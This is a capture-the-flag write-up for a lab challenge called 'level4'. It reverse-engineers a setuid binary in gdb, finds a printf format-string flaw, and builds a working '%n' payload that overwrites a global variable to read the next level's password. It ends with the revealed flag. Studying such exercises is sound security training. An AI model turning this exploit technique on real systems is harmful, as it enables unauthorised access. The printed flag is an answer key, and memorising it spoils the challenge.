# level4

```bash
$ ls -l
total 8
-rwsr-s---+ 1 level5 users 5252 Mar  6  2016 level4
$ file level4
level4: setuid setgid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0xf8cb2bdaa7daab1347b36aaf1c98d49529c605db, not stripped
$ gdb -q ./level4
Reading symbols from /home/user/level4/level4...(no debugging symbols found)...done.
(gdb) info functions
All defined functions:

Non-debugging symbols:
0x080482f8  _init
0x08048340  printf
0x08048340  printf@plt
0x08048350  fgets
0x08048350  fgets@plt
0x08048360  system
0x08048360  system@plt
0x08048370  __gmon_start__
0x08048370  __gmon_start__@plt
0x08048380  __libc_start_main
0x08048380  __libc_start_main@plt
0x08048390  _start
0x080483c0  __do_global_dtors_aux
0x08048420  frame_dummy
0x08048444  p
0x08048457  n
0x080484a7  main
0x080484c0  __libc_csu_init
0x08048530  __libc_csu_fini
0x08048532  __i686.get_pc_thunk.bx
0x08048540  __do_global_ctors_aux
0x0804856c  _fini
(gdb) disas main
Dump of assembler code for function main:
   0x080484a7 <+0>:     push   %ebp
   0x080484a8 <+1>:     mov    %esp,%ebp
   0x080484aa <+3>:     and    $0xfffffff0,%esp
   0x080484ad <+6>:     call   0x8048457 <n>
   0x080484b2 <+11>:    leave
   0x080484b3 <+12>:    ret
End of assembler dump.
(gdb) disas n
Dump of assembler code for function n:
   0x08048457 <+0>:     push   %ebp
   0x08048458 <+1>:     mov    %esp,%ebp
   0x0804845a <+3>:     sub    $0x218,%esp
   0x08048460 <+9>:     mov    0x8049804,%eax
   0x08048465 <+14>:    mov    %eax,0x8(%esp)
   0x08048469 <+18>:    movl   $0x200,0x4(%esp)
   0x08048471 <+26>:    lea    -0x208(%ebp),%eax
   0x08048477 <+32>:    mov    %eax,(%esp)
   0x0804847a <+35>:    call   0x8048350 <fgets@plt>
   0x0804847f <+40>:    lea    -0x208(%ebp),%eax
   0x08048485 <+46>:    mov    %eax,(%esp)
   0x08048488 <+49>:    call   0x8048444 <p>
   0x0804848d <+54>:    mov    0x8049810,%eax
   0x08048492 <+59>:    cmp    $0x1025544,%eax
   0x08048497 <+64>:    jne    0x80484a5 <n+78>
   0x08048499 <+66>:    movl   $0x8048590,(%esp)
   0x080484a0 <+73>:    call   0x8048360 <system@plt>
   0x080484a5 <+78>:    leave
   0x080484a6 <+79>:    ret
End of assembler dump.
(gdb) disas p
Dump of assembler code for function p:
   0x08048444 <+0>:     push   %ebp
   0x08048445 <+1>:     mov    %esp,%ebp
   0x08048447 <+3>:     sub    $0x18,%esp
   0x0804844a <+6>:     mov    0x8(%ebp),%eax
   0x0804844d <+9>:     mov    %eax,(%esp)
   0x08048450 <+12>:    call   0x8048340 <printf@plt>
   0x08048455 <+17>:    leave
   0x08048456 <+18>:    ret
End of assembler dump.
```

```bash
# Decompile main
void main(void)
{
  n();
  return;
}

# Decompile n
void n(void)
{
  char local_20c [520];

  fgets(local_20c,0x200,stdin);
  p(local_20c);
  if (m == 0x1025544) {
    system("/bin/cat /home/user/level5/.pass");
  }
  return;
}

# Decompile p
void p(char *param_1)
{
  printf(param_1);
  return;
}
```

```bash
$ gdb -q ./level4
Reading symbols from /home/user/level4/level4...(no debugging symbols found)...done.
(gdb) b n
Breakpoint 1 at 0x8048460
(gdb) r
Starting program: /home/user/level4/level4

Breakpoint 1, 0x08048460 in n ()
(gdb) info var
All defined variables:

Non-debugging symbols:
...
0x08049810  m
...
```

Même idée que le level3

```bash
$ python -c 'print "BBBB" + " | %x" * 16' > /tmp/payload.txt
$ ./level4 < /tmp/payload.txt
BBBB | b7ff26b0 | bffff784 | b7fd0ff4 | 0 | 0 | bffff748 | 804848d | bffff540 | 200 | b7fd1ac0 | b7ff37d0 | 42424242 | 25207c20 | 207c2078 | 7c207825 | 20782520
# 12th position on the stack
$ nano /tmp/exploit.py
address = "\x10\x98\x04\x08"  # Adresse de `m`
padding = 16930116 - len(address)
exploit_string = address + "%" + str(padding) + "x" + "%12$n"
print(exploit_string)

$ python /tmp/exploit.py > /tmp/payload.txt
$ ./level4 < /tmp/payload.txt
...
...
...
																					b7ff26b0
0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a
```

FLAG: `0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a`
